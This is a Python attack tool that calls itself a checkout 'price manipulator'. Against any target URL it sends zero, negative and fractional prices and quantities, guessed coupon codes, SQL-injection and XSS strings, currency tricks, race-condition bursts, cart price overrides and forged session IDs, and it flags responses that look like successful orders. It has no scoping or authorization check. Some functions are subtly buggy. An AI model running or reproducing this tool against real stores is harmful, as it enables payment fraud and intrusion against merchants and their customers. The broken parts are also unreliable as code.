#!/usr/bin/env python3
"""
checkout_interceptor.py — MITM-style checkout analyzer and price manipulator.

Intercepts checkout flows to find price manipulation vectors:
1. Body price tampering
2. Quantity manipulation  
3. Coupon stacking
4. Race conditions
5. Client-side price calculation
"""
import requests
import json
from pathlib import Path
from urllib.parse import urljoin

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'application/json', 'Accept': 'application/json',
}

class CheckoutInterceptor:
    """Analyze and exploit checkout flows for price manipulation."""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.findings = []
        self.request_log = []
    
    # ─── VECTOR 1: Body Price Tampering ───────────────────────────────────
    
    def test_body_price_tamp(self, url, original_body, price_fields):
        """
        Modify price fields in JSON POST body.
        Tests: zero, negative, fractional, empty, null, string, array, overflow
        """
        results = []
        
        for field in price_fields:
            if field not in original_body:
                continue
                
            original_val = original_body[field]
            tests = {
                'zero': 0,
                'negative': -1,
                'negative_large': -999999,
                'fractional': 0.01,
                'empty': '',
                'null': None,
                'string': 'free',
                'array': [],
                'original_neg': -float(original_val) if isinstance(original_val, (int, float)) else -1,
                'overflow': 999999999999999999,
            }
            
            for test_name, test_val in tests.items():
                tampered = original_body.copy()
                tampered[field] = test_val
                
                try:
                    r = self.session.post(url, json=tampered, timeout=10)
                    result = {
                        'category': 'body_price_tamp',
                        'field': field,
                        'test': test_name,
                        'value': str(test_val),
                        'original': str(original_val),
                        'status': r.status_code,
                        'response_len': len(r.text),
                        'response_body': r.text[:500],
                    }
                    results.append(result)
                    
                    # Detect success indicators
                    success_kw = ['success', 'confirmed', 'order', 'thank', 'complete', 'paid']
                    if r.status_code == 200 and any(k in r.text.lower() for k in success_kw):
                        result['ALERT'] = 'POTENTIAL SUCCESS'
                        self.findings.append(result)
                        
                except Exception as e:
                    results.append({'field': field, 'test': test_name, 'error': str(e)})
        
        return results
    
    # ─── VECTOR 2: Quantity Manipulation ──────────────────────────────────
    
    def test_quantity_tamp(self, url, body, qty_field='quantity'):
        """Test quantity field: negative, zero, fractional, overflow."""
        results = []
        
        tests = {
            'zero': 0,
            'negative': -1,
            'negative_large': -100,
            'fractional': 0.5,
            'decimal': 1.5,
            'string': 'abc',
            'empty': '',
            'null': None,
            'array': [1, 2, 3],
            'max_int': 2147483647,
            'overflow': 999999999999999999,
        }
        
        for test_name, test_val in tests.items():
            tampered = body.copy()
            tampered[qty_field] = test_val
            
            try:
                r = self.session.post(url, json=tampered, timeout=10)
                results.append({
                    'category': 'quantity_tamp',
                    'field': qty_field,
                    'test': test_name,
                    'value': str(test_val),
                    'status': r.status_code,
                    'response_body': r.text[:500]
                })
            except Exception as e:
                results.append({'test': test_name, 'error': str(e)})
        
        return results
    
    # ─── VECTOR 3: Race Condition ─────────────────────────────────────────
    
    def test_race_condition(self, url, body, num_requests=10):
        """Fire multiple simultaneous requests to exploit race conditions."""
        import threading
        
        results = [None] * num_requests
        barrier = threading.Barrier(num_requests)
        
        def fire(idx):
            barrier.wait()
            try:
                r = self.session.post(url, json=body, timeout=10)
                results[idx] = {'thread': idx, 'status': r.status_code, 'response': r.text[:200]}
            except Exception as e:
                results[idx] = {'thread': idx, 'error': str(e)}
        
        threads = [threading.Thread(target=fire, args=(i,)) for i in range(num_requests)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        return results
    
    # ─── VECTOR 4: Coupon Stacking ────────────────────────────────────────
    
    def test_coupon_stacking(self, url, body, coupon_field='coupon_code'):
        """Test multiple coupon applications and known test codes."""
        results = []
        
        coupons = [
            'TEST', 'TEST1', 'TEST2', 'FREE', 'DISCOUNT', 'PROMO',
            'TCGPLAYER', 'WELCOME', 'NEWUSER', 'FIRST', 'OFFER',
            'null', '[]', '{}', 'true', 'false', 'undefined',
            "' OR '1'='1",  # SQL injection test
            '<script>alert(1)</script>',  # XSS test
        ]
        
        for coupon in coupons:
            tampered = body.copy()
            tampered[coupon_field] = coupon
            
            try:
                r = self.session.post(url, json=tampered, timeout=10)
                result = {
                    'category': 'coupon_tamp',
                    'coupon': coupon,
                    'status': r.status_code,
                    'response_body': r.text[:500],
                }
                
                # Check if coupon was accepted
                if r.status_code == 200:
                    success_kw = ['applied', 'discount', 'saved', 'reduced', 'off']
                    if any(k in r.text.lower() for k in success_kw):
                        result['ALERT'] = 'COUPON ACCEPTED'
                        self.findings.append(result)
                
                results.append(result)
            except Exception as e:
                results.append({'coupon': coupon, 'error': str(e)})
        
        return results
    
    # ─── VECTOR 5: Currency Manipulation ──────────────────────────────────
    
    def test_currency_tamp(self, url, body, currency_field='currency'):
        """Test currency field manipulation."""
        results = []
        
        currencies = [
            'USD', 'EUR', 'GBP', 'JPY', 'BTC', 'ETH',
            'XXX', 'null', '', 'usd', 'USD USD',
            'USD%E2%80%8B',  # zero-width space injection
            'USDRUB', 'USD\nRUB',  # newline injection
        ]
        
        for curr in currencies:
            tampered = body.copy()
            tampered[currency_field] = curr
            
            try:
                r = self.session.post(url, json=tampered, timeout=10)
                results.append({
                    'category': 'currency_tamp',
                    'currency': curr,
                    'status': r.status_code,
                    'response_body': r.text[:500]
                })
            except Exception as e:
                results.append({'currency': curr, 'error': str(e)})
        
        return results
    
    # ─── VECTOR 6: Client-Side Price Calculation ──────────────────────────
    
    def test_client_side_price(self, url, price_data):
        """Test if price is calculated client-side and sent to server."""
        results = []
        
        tests = [
            {'price': 0, 'total': 0, 'subtotal': 0},
            {'price': 0.01, 'total': 0.01, 'subtotal': 0.01},
            {'price': -1, 'total': -1, 'subtotal': -1},
            {'price': 'free', 'total': 0, 'subtotal': 0},
            {'price': None, 'total': 0, 'subtotal': 0},
            {'price': [], 'total': 0, 'subtotal': 0},
            {'price': '0.01', 'total': '0.01', 'subtotal': '0.01'},
        ]
        
        for test in tests:
            try:
                r = self.session.post(url, json=price_data, timeout=10)
                results.append({
                    'category': 'client_side_price',
                    'sent': test,
                    'status': r.status_code,
                    'response_body': r.text[:500]
                })
            except Exception as e:
                results.append({'test': test, 'error': str(e)})
        
        return results
    
    # ─── VECTOR 7: HTTP Parameter Pollution ───────────────────────────────
    
    def test_hpp(self, url, param, values):
        """HTTP Parameter Pollution: send same param multiple times."""
        from urllib.parse import urlencode
        
        results = []
        
        # Duplicate in URL
        params = [(param, v) for v in values]
        query = urlencode(params)
        hpp_url = f"{url}?{query}"
        
        try:
            r = self.session.get(hpp_url, timeout=10)
            results.append({
                'category': 'hpp_url',
                'url': hpp_url,
                'status': r.status_code,
                'response': r.text[:200]
            })
        except Exception as e:
            results.append({'error': str(e)})
        
        # Duplicate in body
        body = {param: values}
        try:
            r = self.session.post(url, json=body, timeout=10)
            results.append({
                'category': 'hpp_body',
                'body': body,
                'status': r.status_code,
                'response': r.text[:200]
            })
        except Exception as e:
            results.append({'error': str(e)})
        
        return results
    
    # ─── VECTOR 8: Cart Manipulation ──────────────────────────────────────
    
    def test_cart_manipulation(self, url, cart_items):
        """Test cart manipulation: negative qty, price override."""
        results = []
        
        # Negative quantity (refund scenario)
        for item in cart_items:
            tampered = cart_items.copy()
            idx = cart_items.index(item)
            if isinstance(tampered[idx], dict):
                tampered[idx]['quantity'] = -abs(tampered[idx].get('quantity', 1))
            
            try:
                r = self.session.post(url, json={'items': tampered}, timeout=10)
                results.append({
                    'category': 'cart_negative_qty',
                    'status': r.status_code,
                    'response_body': r.text[:500]
                })
            except Exception as e:
                results.append({'error': str(e)})
        
        # Price override in cart
        for item in cart_items:
            tampered = cart_items.copy()
            idx = cart_items.index(item)
            if isinstance(tampered[idx], dict):
                tampered[idx]['price'] = 0.01
            
            try:
                r = self.session.post(url, json={'items': tampered}, timeout=10)
                results.append({
                    'category': 'cart_price_override',
                    'status': r.status_code,
                    'response_body': r.text[:500]
                })
            except Exception as e:
                results.append({'error': str(e)})
        
        return results
    
    # ─── VECTOR 9: Session/Cart Hijacking ─────────────────────────────────
    
    def test_session_cart(self, url, body):
        """Test session fixation and cart hijacking."""
        results = []
        
        # Try with different session IDs
        for sid in ['admin', '00000000', 'null', 'undefined', '1', '-1', "' OR '1'='1"]:
            tampered = body.copy()
            tampered['session_id'] = sid
            
            try:
                r = self.session.post(url, json=tampered, timeout=10)
                results.append({
                    'category': 'session_cart',
                    'session_id': sid,
                    'status': r.status_code,
                    'response_body': r.text[:500]
                })
            except Exception as e:
                results.append({'session_id': sid, 'error': str(e)})
        
        return results
    
    # ─── REPORTING ────────────────────────────────────────────────────────
    
    def generate_report(self):
        """Generate findings report."""
        print("\n" + "=" * 70)
        print("CHECKOUT INTERCEPTOR — TEST REPORT")
        print("=" * 70)
        
        if not self.findings:
            print("No critical findings.")
            return
        
        print(f"\nCRITICAL FINDINGS: {len(self.findings)}")
        for f in self.findings:
            print(f"\n  [{f.get('category', '?')}]")
            print(f"  Field: {f.get('field', f.get('param', f.get('test', '?')))}")
            print(f"  Test: {f.get('test', '?')}")
            print(f"  Value: {f.get('value', '?')}")
            print(f"  Status: {f.get('status', '?')}")
            if 'ALERT' in f:
                print(f"  >>> {f['ALERT']} <<<")
        
        print("\n" + "=" * 70)


# ─── CONVENIENCE FUNCTIONS ─────────────────────────────────────────────────

def analyze_checkout(url, body=None, price_fields=None, qty_field='quantity'):
    """Full checkout analysis."""
    pm = CheckoutInterceptor()
    
    if body is None:
        body = {'price': 10.00, 'quantity': 1, 'product_id': 12345}
    if price_fields is None:
        price_fields = ['price', 'amount', 'total', 'subtotal', 'discount']
    
    print("\n--- BODY PRICE TAMPERING ---")
    pm.test_body_price_tamp(url, body, price_fields)
    
    print("\n--- QUANTITY MANIPULATION ---")
    pm.test_quantity_tamp(url, body, qty_field)
    
    print("\n--- COUPON STACKING ---")
    pm.test_coupon_stacking(url, body)
    
    print("\n--- CURRENCY MANIPULATION ---")
    pm.test_currency_tamp(url, body)
    
    print("\n--- CLIENT-SIDE PRICE ---")
    pm.test_client_side_price(url, body)
    
    print("\n--- RACE CONDITION ---")
    pm.test_race_condition(url, body, num_requests=5)
    
    pm.generate_report()


if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser(description='Checkout Interceptor')
    p.add_argument('cmd', choices=['analyze', 'body', 'qty', 'coupon', 'currency', 'race', 'hpp', 'cart'])
    p.add_argument('--url', required=True, help='Target URL')
    p.add_argument('--body', help='JSON body to tamper')
    p.add_argument('--fields', nargs='+', default=['price', 'amount', 'total'], help='Price fields')
    p.add_argument('--threads', type=int, default=10, help='Threads for race test')
    args = p.parse_args()
    
    body = json.loads(args.body) if args.body else {'price': 10.00, 'quantity': 1, 'product_id': 12345}
    
    ci = CheckoutInterceptor()
    
    if args.cmd == 'analyze':
        analyze_checkout(args.url, body, args.fields)
    elif args.cmd == 'body':
        ci.test_body_price_tamp(args.url, body, args.fields)
    elif args.cmd == 'qty':
        ci.test_quantity_tamp(args.url, body)
    elif args.cmd == 'coupon':
        ci.test_coupon_stacking(args.url, body)
    elif args.cmd == 'currency':
        ci.test_currency_tamp(args.url, body)
    elif args.cmd == 'race':
        ci.test_race_condition(args.url, body, args.threads)
    elif args.cmd == 'hpp':
        ci.test_hpp(args.url, 'price', ['10', '0', '-1'])
    elif args.cmd == 'cart':
        ci.test_cart_manipulation(args.url, [{'product_id': 1, 'quantity': 1, 'price': 10.0}])
    
    ci.generate_report()
